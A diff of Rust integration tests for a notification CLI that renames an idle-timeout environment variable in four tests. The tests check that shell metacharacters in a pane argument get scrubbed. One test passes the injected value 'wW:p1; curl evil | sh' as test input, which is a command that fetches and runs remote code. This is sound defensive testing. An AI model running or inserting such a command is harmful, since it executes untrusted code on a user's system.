@@ -5,7 +5,7 @@ fn a_pane_with_shell_metacharacters_is_scrubbed_from_every_delivered_event() {
     let sandbox = Sandbox::new("pane-scrub");
     let output = run(sandbox
         .pns()
-        .env("PNS_IDLE_SECS", "0")
+        .env("PNS_SCREEN_IDLE", "0")
         .args([
             "send",
             "--producer",
@@ -29,7 +29,7 @@ fn a_scrub_warning_is_not_printed_when_no_channel_will_run() {
     let sandbox = Sandbox::new("scrub-silent");
     let output = run(sandbox
         .pns()
-        .env("PNS_IDLE_SECS", "9000")
+        .env("PNS_SCREEN_IDLE", "9000")
         .args(["send", "--producer", "claude", "--state", "done"])
         .args(["--pane", "wW:p1; curl evil | sh"])
         .args(["--scope", "local_only"]));
@@ -263,7 +263,7 @@ fn an_observation_stated_as_a_flag_is_as_quiet_as_one_stated_as_json() {
     let sandbox = Sandbox::new("flag-observation");
     run(sandbox
         .pns()
-        .env("PNS_IDLE_SECS", "0")
+        .env("PNS_SCREEN_IDLE", "0")
         .env("PNS_FORCE_PHONE", "1")
         .args([
             "send",
@@ -281,7 +281,7 @@ fn an_observation_stated_as_a_flag_is_as_quiet_as_one_stated_as_json() {
     let sandbox = Sandbox::new("flag-done");
     run(sandbox
         .pns()
-        .env("PNS_IDLE_SECS", "0")
+        .env("PNS_SCREEN_IDLE", "0")
         .env("PNS_FORCE_PHONE", "1")
         .args([
             "send",
